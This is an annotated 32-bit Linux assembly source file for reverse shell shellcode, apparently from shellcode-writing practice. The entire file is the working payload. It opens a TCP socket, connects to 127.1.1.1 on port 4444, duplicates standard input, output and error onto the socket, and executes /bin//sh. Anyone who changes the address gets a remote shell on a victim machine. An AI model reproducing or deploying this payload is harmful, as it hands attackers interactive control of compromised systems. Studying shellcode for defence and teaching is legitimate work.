; nasm -f elf32 -o rev.o rev.asm
; ld -m elf_i386 -o rev rev.o && ./rev
; 32-bit linux

section .bss

section .text
    global _start:

    ; creating socket

    ; int socketcall(int call, unsigned long *args);
    push    0x66   ; sys_socketcall 102
    pop     eax     ; zero out eax

    push    0x1    ; sys_socket 0x1
    pop     ebx     ; zero out ebx

    ; the socket() call basically takes 3 arguments and returns a socket file descriptor
    xor edx, edx    ; zero out edx

    ; socket(int socket_family, int socket_type, int protocol);
    push    edx        ; protocol = IPPROTO_IP (0x0)
    push    ebx        ; socket_type = SOCK_STREAM (0x1)
    push    0x2        ; socket_family = AF_INET (0x2)

    ; ecx needs to hold a pointer to this structure, a copy of the esp is required
    mov     ecx, esp    ; move SP to ecx
    int     0x80        ; exec sys_socket (returns file descriptor eax)

    xchg    edx, eax   ; save result (sockfd) for later

    ; ########## connect to a specified IP and port ##########
    
    ; int socketcall(int call, unsigned long *args);
    mov     al, 0x66    ; socketcall 102

    ; struct sockaddr_in {
    ;   __kernel_sa_family_t sin_family; // address family
    ;   __be16               sin_port;   // port number
    ;   struct in_addr       sin_addr;   // internet address
    ; };

    push    0x0101017f     ; sin_addr = 127.1.1.1 (network byte order)
    push    word 0x5c11    ; sin_port = 4444

    ; ebx contains 0x1 at this point because of pressing socket_type 
    ; during the socket() call, so after increasing ebx, ebx should be 0x2 
    ; (the sin_family argument):

    inc     ebx         ; ebx = 0x02
    push    word bx    ; sin_family = AF_INET

    ; save the stack pointer to this sockaddr struct in ecx:
    mov     ecx, esp    ; mov SP to sockaddr struct

    push    0x10       ; addrlen = 16
    push    ecx        ; const struct sockaddr *addr
    push    edx        ; sockfd
    mov     ecx, esp   ; move SP to ecx (sockaddr_in struct)
    inc     ebx        ; sys_connect (0x3)
    int     0x80       ; syscall (exec sys_connect)

    ; ########## redirect stdin, stdout, stderr via dup2 ##########

    push    0x2        ; set counter to 2
    pop     ecx        ; zero to ecx (reset for newfd loop)
    xchg    ebx, edx   ; save sockfd

    ; int dup2(int oldfd, int newfd);
    ; oldfd = client socket file descriptor
    ; newfd is used with stdin(0), stdout(1) and stderr(2)

    dup:
        mov  al, 0x3f    ; sys_dup = 63 = 0x3f
        int  0x80        ; syscall (exec sys_dup2)
        dec  ecx         ; decrement counter
        jns  dup         ; as long as SF is not set -> jmp to dup

    mov     al, 0x0B        ; syscall: sys_execve = 11
    inc     ecx             ; argv=0
    mov     edx, ecx        ; envp=0
    push    edx            ; \0
    push    0x68732f2f
    push    0x6e69622f
    mov     ebx, esp
    int     0x80

